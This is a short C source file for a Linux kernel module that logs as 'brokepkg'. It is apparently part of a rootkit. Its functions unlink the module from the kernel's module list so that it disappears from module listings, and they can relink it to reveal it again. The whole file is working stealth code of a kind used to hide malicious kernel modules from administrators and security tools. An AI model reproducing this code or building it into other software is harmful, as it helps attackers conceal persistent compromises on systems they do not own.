#include <linux/init.h>
// header
#include <linux/kallsyms.h>
#include <linux/module.h>

#include "config.h"

static struct list_head *prev_module;
static short isHidden = 0;

void module_show(void) {
  list_add(&THIS_MODULE->list, prev_module);
  isHidden = 0;
#ifdef DEBUG
  printk(KERN_INFO "brokepkg: module revealed");
#endif
}

void module_hide(void) {
  prev_module = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
  isHidden = 1;
#ifdef DEBUG
  printk(KERN_INFO "brokepkg: hidden module");
#endif
}

void switch_module_hide(void) {
  if (isHidden)
    module_show();
  else
    module_hide();
}
